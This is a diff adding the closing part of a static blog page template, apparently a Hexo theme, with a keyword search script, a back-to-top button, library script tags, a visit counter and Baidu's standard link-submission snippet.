+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
